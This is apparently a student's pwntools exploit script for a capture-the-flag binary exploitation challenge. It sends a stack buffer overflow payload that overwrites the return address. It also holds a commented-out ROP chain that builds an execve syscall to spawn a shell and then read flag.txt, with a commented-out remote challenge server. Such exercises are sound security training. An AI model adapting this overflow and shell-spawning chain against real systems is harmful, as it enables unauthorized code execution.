import struct

import pwn
from pwn import *

p = process('./really_obnoxious_problem')
#print(p.pid)
#p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1342)

print(p.recvuntil(b":"))
p.sendline(b"gc2877")
print(p.recvuntil(b":"))


pop_rax = 0x00400646
pop_rdi = 0x0040062e
pop_rsi = 0x00400636
pop_rdx = 0x0040063e
execute_syscall = 0x00400625

def address(data):
    return struct.pack("<L", data)

#I'm not even pretending this isn't a stack-smash anymore. Please pop a shell!
#p.recv(1024)

"""
input = b'A'*32 + b'B'*8 \
        + pwn.p64(pop_rdi) + pwn.p64(0x400708) \
        + pwn.p64(pop_rsi) + pwn.p64(0x00) \
        + pwn.p64(pop_rdx) + pwn.p64(0x00) \
        + pwn.p64(pop_rax) + pwn.p64(0x3b) \
        + pwn.p64(execute_syscall)

"""

#input = b'A'*64 + b'B'*8 + b'C'*4
#input = b'A'*64 + b'\x56\x12\x40\x00' + b'C'*4
input = b'\x41'*64 + b'\x90'*8 + b'\x56\x12\x40\x00'
print(input)

p.send(input)

response = p.recv(timeout=1)
print(response)

"""
response = p.recv(timeout=1)
print(response)
p.send(b'ls\n')
response = p.recv(timeout=1)
print(response)
p.send(b'cat flag.txt\n')
print(response)
p.interactive()

"""

